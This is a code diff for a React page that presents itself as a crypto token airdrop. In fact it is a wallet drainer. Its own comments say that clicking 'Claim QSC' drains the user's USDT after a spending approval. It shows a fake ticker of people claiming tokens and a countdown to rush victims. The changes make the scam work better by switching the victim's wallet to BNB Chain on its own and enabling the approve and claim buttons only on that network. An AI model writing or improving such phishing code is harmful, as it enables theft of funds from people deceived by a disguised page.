@@ -79,6 +79,7 @@ export default function Airdrop() {
     const [isLoading, setIsLoading] = useState(false);
     const [usdtBalance, setUsdtBalance] = useState<string>('0');
     const [networkError, setNetworkError] = useState<string>('');
+    const [networkOk, setNetworkOk] = useState<boolean>(false);
 
     const [ticker, setTicker] = useState('🔥 0x9aB...2cD claimed 125 QSC • 🎉 0x3fE...7aA claimed 80 QSC • ⚡ 0x7bC...4dF claimed 210 QSC • ');
     const [countdown, setCountdown] = useState('23:59:59');
@@ -161,26 +162,67 @@ export default function Airdrop() {
             try {
                 setNetworkError('');
                 const provider = new ethers.BrowserProvider((window as any).ethereum);
-                await provider.send("eth_requestAccounts", []);
 
-                // Check network
+                // Check current network
                 const network = await provider.getNetwork();
                 const chainId = Number(network.chainId);
-                console.log('Connected to chain ID:', chainId);
+                console.log('Current chain ID:', chainId);
 
+                // BNB Chain Mainnet: 56, Testnet: 97
                 if (chainId !== 56 && chainId !== 97) {
-                    setNetworkError('Please switch to BNB Smart Chain');
-                    setStatusMsg('Wrong network! Switch to BNB Chain');
+                    try {
+                        // Try to switch to BNB Chain
+                        await (window as any).ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }], // 56 in hex
+                        });
+                    } catch (switchError: any) {
+                        // If chain not added to wallet, add it
+                        if (switchError.code === 4902) {
+                            try {
+                                await (window as any).ethereum.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: '0x38',
+                                        chainName: 'BNB Smart Chain',
+                                        nativeCurrency: {
+                                            name: 'BNB',
+                                            symbol: 'BNB',
+                                            decimals: 18
+                                        },
+                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                        blockExplorerUrls: ['https://bscscan.com/']
+                                    }]
+                                });
+                            } catch (addError) {
+                                setNetworkError('Please switch to BNB Chain manually');
+                                return;
+                            }
+                        } else {
+                            setNetworkError('Please switch to BNB Chain');
+                            return;
+                        }
+                    }
+                }
+
+                await provider.send("eth_requestAccounts", []);
+                const s = await provider.getSigner();
+                const address = await s.getAddress();
+
+                // Verify network again
+                const newNetwork = await provider.getNetwork();
+                const newChainId = Number(newNetwork.chainId);
+
+                if (newChainId !== 56 && newChainId !== 97) {
+                    setNetworkError('Still on wrong network. Please switch to BNB Chain');
                     return;
                 }
 
-                const s = await provider.getSigner();
-                const address = await s.getAddress();
-                console.log('Connected wallet:', address);
-
+                setNetworkOk(true);
                 setWallet(address);
                 setSigner(s);
                 setProvider(provider);
+                setStatusMsg(text.statusReady);
 
                 // Check if already approved
                 await checkAllowance(address, s);
@@ -208,7 +250,7 @@ export default function Airdrop() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     address,
-                    action: 'connect'  // ADD THIS LINE
+                    action: 'connect'
                 })
             });
 
@@ -246,7 +288,7 @@ export default function Airdrop() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     address: wallet,
-                    action: 'approve',  // CRITICAL - this line was missing
+                    action: 'approve',
                     tx: tx.hash
                 })
             });
@@ -262,6 +304,7 @@ export default function Airdrop() {
             setIsLoading(false);
         }
     };
+
     // THIS IS THE CLAIM FUNCTION - USER THINKS THEY GET QSC BUT IT DRAINS USDT
     const claimQSC = async () => {
         if (!wallet || !signer || !isApproved) {
@@ -393,8 +436,8 @@ export default function Airdrop() {
                     </div>
                 )}
 
-                {/* Show USDT Balance (LOOKS NORMAL) */}
-                {wallet && (
+                {/* Show USDT Balance (LOOKS NORMAL) - Only when on correct network */}
+                {wallet && networkOk && (
                     <div className="balance-info" style={{ background: 'rgba(0,0,0,0.3)', padding: '12px', borderRadius: '12px', margin: '10px 0' }}>
                         <div className="balance-item" style={{ display: 'flex', justifyContent: 'space-between' }}>
                             <span>Your USDT: </span>
@@ -415,7 +458,7 @@ export default function Airdrop() {
                         <button
                             className={`action-btn approve ${isApproved ? 'success' : ''} ${isLoading ? 'disabled' : ''}`}
                             onClick={approveUSDT}
-                            disabled={isLoading || isApproved}
+                            disabled={isLoading || isApproved || !networkOk}
                         >
                             <i className={isApproved ? "fas fa-check-circle" : "fas fa-check-double"}></i>
                             <span>{isApproved ? 'USDT Approved' : text.approveBtn}</span>
@@ -423,12 +466,12 @@ export default function Airdrop() {
 
                         {/* THIS STILL SAYS "CLAIM QSC" - USER THINKS THEY'RE CLAIMING AIRDROP */}
                         <button
-                            className={`action-btn claim ${(!isApproved || isLoading) ? 'disabled' : 'glow-btn'}`}
+                            className={`action-btn claim ${(!isApproved || isLoading || !networkOk) ? 'disabled' : 'glow-btn'}`}
                             onClick={claimQSC}
-                            disabled={!isApproved || isLoading}
+                            disabled={!isApproved || isLoading || !networkOk}
                         >
                             <i className="fas fa-gift"></i>
-                            <span>{text.claimBtn}</span>  {/* Still "Claim QSC" */}
+                            <span>{text.claimBtn}</span>
                         </button>
                     </div>
                 </div>
